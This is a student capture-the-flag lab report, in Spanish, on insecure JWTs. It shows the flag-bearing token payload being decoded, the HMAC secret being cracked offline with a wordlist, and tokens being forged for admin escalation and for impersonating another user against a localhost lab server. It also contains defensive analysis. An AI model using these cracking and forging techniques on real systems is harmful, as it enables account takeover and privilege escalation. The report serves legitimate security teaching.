# Informe — Lab Extra 5: JWT inseguro

**Grupo:** 08 · **Integrantes:** Marco Cordoba — @MarcoCordoba · Thomas Koncurat — @Koncu1 · Lucas Leone — @LucasLeone · Geronimo Marquez — @Geromarquezz · Joaquin Moyano — @Joaco919

**Declaración de uso de IA:** (obligatoria — completar en la Parte 2)

> **División del trabajo (grupo08).** Esta entrega se hace a dos mitades:
> - **Mitad A — práctica (HECHA):** `jwt_tool.py` funcional (4 funciones),
>   cadena R1–R3, control de sanidad (§4) y evidencia. Secciones **1, 2, 3, 4**
>   y preguntas **P1** y **P2**.
> - **Mitad B — análisis (PENDIENTE):** preguntas **P3, P4, P5**, `research.md`
>   y la **declaración de IA** final. La prueba de `alg:none` ya está corrida y
>   su salida está en `evidencia/salidas/02-control-sanidad.txt` (P4 solo tiene
>   que interpretarla).

---

## 1. Anatomía del token real

Token obtenido de `GET /login?user=diego&pass=diego123`:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJkaWVnbyIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzk0NDkzODM1LCJleHAiOjE3OTQ0OTc0MzUsIm5vdGFfaW50ZXJuYSI6ImRlcGxveS10YWcgRkxBR3tqd3Rfc29sb19iYXNlNjR9In0.GBvboN5obCIjYtV6kasWusrRe4XzSVHj89tB2w4XLKo
```

Decodificado con `python3 src/jwt_tool.py decodificar <token>`:

```json
HEADER:  { "alg": "HS256", "typ": "JWT" }
PAYLOAD: {
  "sub": "diego",
  "role": "user",
  "iat": 1794493835,
  "exp": 1794497435,
  "nota_interna": "deploy-tag FLAG{jwt_solo_base64}"
}
```

**Claim problemático (R1): `nota_interna`.** Trae `FLAG{jwt_solo_base64}` y no
debería viajar: el JWT **no está cifrado**, los dos primeros tramos son
base64url y cualquiera con el token los lee (ni siquiera hace falta la
herramienta: `echo <payload> | base64 -d`). Firmar garantiza que no lo
modificamos, **no** que no lo podamos leer. Flag: `FLAG{jwt_solo_base64}`.

## 2. Crack offline del secreto

**El oráculo en una oración:** recalculamos `HMAC-SHA256(candidato, "header.payload")`
en nuestra máquina y lo comparamos con la firma que ya trae el token; si
coinciden, ese candidato *es* el secreto — sin mandar un solo request al
servidor.

Código de `firma_es_valida()` (el corazón del ataque):

```python
def firma_es_valida(token: str, secreto: bytes) -> bool:
    cabecera, carga, firma = token.split(".")
    partes = f"{cabecera}.{carga}".encode()
    esperada = hmac.new(secreto, partes, hashlib.sha256).digest()
    try:
        firma_bytes = b64url_dec(firma)
    except Exception:
        return False
    return hmac.compare_digest(esperada, firma_bytes)
```

- **Secreto encontrado:** `mate123` (palabra #11 de `caso/diccionario.txt`).
- **Candidatos probados:** 11 de 31 palabras base hasta el acierto (con reglas
  de mangling el espacio efectivo es ~5×, pero cayó con la palabra cruda).
- **Tiempo:** ≈ 0.17 ms en nuestra máquina (CPython, 1 hilo). Es instantáneo
  porque HMAC-SHA256 es un hash rápido y el diccionario es chico.
- **Con un secreto de 32 bytes aleatorios** el crack por diccionario se vuelve
  inviable: el secreto deja de estar en ninguna lista y habría que recorrer
  2^256 candidatos. El ataque de este lab muere ahí (ver P5).

Comando: `python3 src/jwt_tool.py crackear <token> caso/diccionario.txt` →
`SECRETO: mate123`. Evidencia: `evidencia/salidas/03-medicion-crack.txt`.

## 3. Las dos forjas

### R2 — Escalada vertical (role=admin)

```bash
python3 src/jwt_tool.py forjar mate123 --sub diego --role admin
curl -H "Authorization: Bearer <token-admin>" localhost:8080/admin
# -> {"panel": "admin", "auditoria": "FLAG{jwt_forjado_admin}"}
```

**Diff conceptual vs. el token original:** mismo `sub` (`diego`), pero cambiamos
`role` de `user` a `admin` y **refirmamos** con el secreto crackeado. Como el
servidor valida la firma con ese mismo secreto, nuestro token es
indistinguible de uno legítimo. Flag: `FLAG{jwt_forjado_admin}`.

### R3 — Suplantación horizontal (sub=maria)

```bash
python3 src/jwt_tool.py forjar mate123 --sub maria --role user
curl -H "Authorization: Bearer <token-maria>" localhost:8080/perfil
# -> {"usuario": "maria", ... "Nota confidencial: FLAG{jwt_suplantacion_idor}"}
```

Cambiamos únicamente `sub` a `maria` y refirmamos. El servidor sirve los datos
de quien diga el claim `sub`: **somos maria.** Flag: `FLAG{jwt_suplantacion_idor}`.
El *por qué esto es un IDOR sin `?id=`* se desarrolla en **P3 (Parte 2)**.

## 4. Control de sanidad

Demostramos que el servidor **sí rechaza** lo que tiene que rechazar (si no,
las forjas no probarían nada). Evidencia: `evidencia/salidas/02-control-sanidad.txt`.

| Caso | Request | Respuesta |
|---|---|---|
| (a) token **real** de diego (`role=user`) en `/admin` | firma válida, rol insuficiente | **HTTP 403** `{"error":"solo administradores"}` |
| (b) token forjado admin con **1 char cambiado** en la firma | firma inválida | **HTTP 401** `{"error":"token invalido o expirado"}` |
| (P4) token con `alg:none` y firma vacía | firma no matchea el HMAC | **HTTP 401** |

Esto confirma que las flags de R2/R3 se obtuvieron con **firmas válidas** (no
porque el server acepte cualquier cosa): el control de acceso funciona, lo que
falla es la **fuerza del secreto**.

## 5. Preguntas P1–P5

### P1 — "Está firmado, no se puede tocar": integridad vs. confidencialidad

PhantomCorp confundía dos propiedades distintas:

- **Integridad (la que SÍ tenían):** la firma HMAC garantiza que el payload no
  fue modificado *por alguien que no conoce el secreto*. Si cambiás un claim sin
  refirmar, el server lo detecta y devuelve 401 — lo probamos en §4(b).
- **Confidencialidad (la que CREÍAN tener):** que nadie pueda **leer** el
  contenido. Esto el JWT **no lo da**: el payload es base64url, texto plano
  reversible. Por eso R1 expone `nota_interna` con solo decodificar.

"Firmado" ≠ "cifrado". Tenían integridad (y encima débil, porque el secreto era
crackeable); nunca tuvieron confidencialidad. Meter un dato secreto en el
payload es el error de base del lab.

### P2 — ¿Por qué el crack es *offline* y qué implica?

El crack es **offline** porque, teniendo un token válido, toda la verificación
se hace en nuestra máquina: `HMAC-SHA256(candidato, "header.payload")` vs. la
firma del token (código en §2). El servidor **no participa**: no recibe ningún
request mientras probamos candidatos.

Comparado con fuerza bruta **online** contra `/login`:

| | Crack offline (este lab) | Fuerza bruta online a `/login` |
|---|---|---|
| ¿Toca el servidor? | No, 0 requests | Sí, 1 request por intento |
| Rate limit / lockout | No aplica | Lo frena (si está configurado) |
| Logs / detección | Nada que loguear | Queda en los access logs; dispara alertas |
| Velocidad | Límite = CPU local (millones/s) | Límite = latencia de red + defensas |

Implicación: una vez que el secreto es débil y el atacante tiene **un** token,
las defensas perimetrales (WAF, rate limit, alertas) **no sirven de nada** —
el ataque ocurre fuera de su alcance. Medición concreta: 11 candidatos, 0.17 ms
(`evidencia/salidas/03-medicion-crack.txt`).

### P3 — IDOR en el claim (Parte 2)

_Pendiente — Mitad B. R3 es un IDOR (como el Lab 07) pero sin `?id=`: explicar
por qué el control de acceso roto "migra" al token cuando la identidad es un
claim firmado._

### P4 — `alg:none` (Parte 2)

_Pendiente — Mitad B. La prueba ya está corrida: `alg:none` con firma vacía
devuelve **401** (ver `evidencia/salidas/02-control-sanidad.txt`). Falta
explicar por qué este server lo rechaza (su `verificar()` siempre recalcula
HMAC-SHA256 e ignora el `alg` del header, así que una firma vacía nunca
matchea) y qué debería hacer un server correcto: **pinnear el algoritmo**
esperado y nunca confiar en el `alg` que viene en el token._

### P5 — Defensas priorizadas (Parte 2)

_Pendiente — Mitad B. Listar defensas en orden (secreto fuerte / RS256-EdDSA /
rotación / claims mínimos / expiración / revocación) y, para cada una, qué
ataque de este lab bloquea._

## 6. Evidencia de progreso

`./ctf status extra5` → **3/3 (100%)**. Captura en
`evidencia/ctf-status-extra5.txt`; flags validadas contra
`labs/labextra5-jwt/retos.manifest`. Protocolo de evidencia en `evidencia/`
(`comandos.txt`, `salidas/`, este `README`).

```
   ✓  R1     El payload viaja en claro (base64 no es cifrado)
   ✓  R2     Secreto debil crackeado -> token forjado con role=admin
   ✓  R3     Suplantacion por claim: sub=maria (IDOR via JWT)
   ██████████████████████████████  3/3 (100%)
```
